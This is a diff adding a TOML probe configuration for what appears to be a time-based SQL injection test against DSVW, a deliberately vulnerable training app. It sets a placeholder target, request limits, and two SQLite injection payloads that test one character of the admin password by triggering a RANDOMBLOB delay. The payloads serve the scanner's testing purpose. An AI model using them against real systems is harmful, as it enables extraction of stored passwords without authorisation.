@@ -1,0 +1,28 @@
+# Payloads are derived from DSVW's documented time attack at dsvw.py line 10
+# in commit 9ca3c9acf3defa0a6148d40e5f5cebeb5dcbb908. The fixed 0.5-second
+# expectation is a conservative pre-measurement threshold for its CPU-bound
+# RANDOMBLOB(300000000) delay; it is not tuned from Vintar output.
+config_version = 1
+type = "sqli.time"
+input_id = "input-0927742c7a4ae9527f51f8c541502371"
+
+[target]
+url = "__ORIGIN__/"
+allowed_origin = "__ORIGIN__"
+
+[injection]
+location = "query"
+name = "id"
+occurrence = 0
+mode = "replace"
+
+[probes]
+selection = "explicit"
+delay_payload = "(SELECT (CASE WHEN (SUBSTR((SELECT password FROM users WHERE name='admin'),2,1)='e') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000))))) ELSE 0 END))"
+control_payload = "(SELECT (CASE WHEN (SUBSTR((SELECT password FROM users WHERE name='admin'),2,1)='x') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000))))) ELSE 0 END))"
+expected_delay_seconds = 0.5
+
+[limits]
+max_requests = 9
+requests_per_second = 10.0
+timeout_seconds = 5.0
